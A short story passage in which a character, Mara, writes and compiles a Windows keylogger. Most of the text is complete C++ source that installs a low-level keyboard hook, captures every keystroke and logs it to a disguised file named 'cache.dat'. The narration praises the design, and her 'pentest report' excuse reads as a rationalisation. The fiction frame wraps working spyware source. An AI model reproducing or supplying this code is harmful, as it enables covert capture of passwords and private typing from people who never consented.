Mara cracked her knuckles and pulled the keyboard closer. The IDE's cursor blinked, patient, indifferent.

She started with the skeleton — a callback, a hook, the loop that would keep it all breathing.

```cpp
#include <windows.h>
#include <fstream>

std::ofstream g_log;
char g_buffer[256];
int g_len = 0;

LRESULT CALLBACK KeyProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            BYTE state[256];
            GetKeyboardState(state);
            WORD ch = 0;
            if (ToAscii(k->vkCode, k->scanCode, state, &ch, 0) == 1) {
                g_buffer[g_len++] = (char)ch;
                if (g_len >= sizeof(g_buffer) - 1) {
                    g_log.write(g_buffer, g_len);
                    g_log.flush();
                    g_len = 0;
                }
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    g_log.open("cache.dat", std::ios::app);
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hook);
    return 0;
}
```

She leaned back and read it over. A hook to slip in front of the keyboard. A callback the system would call on every keydown. A buffer to collect the characters, flushed to disk before it overflowed. And the message loop at the bottom — the quiet heartbeat that kept the whole thing alive, doing nothing visible while it waited.

*Elegant, actually,* she thought. *Ninety percent of it is plumbing.*

She saved the file, told herself it was for the pentest report, and hit compile.

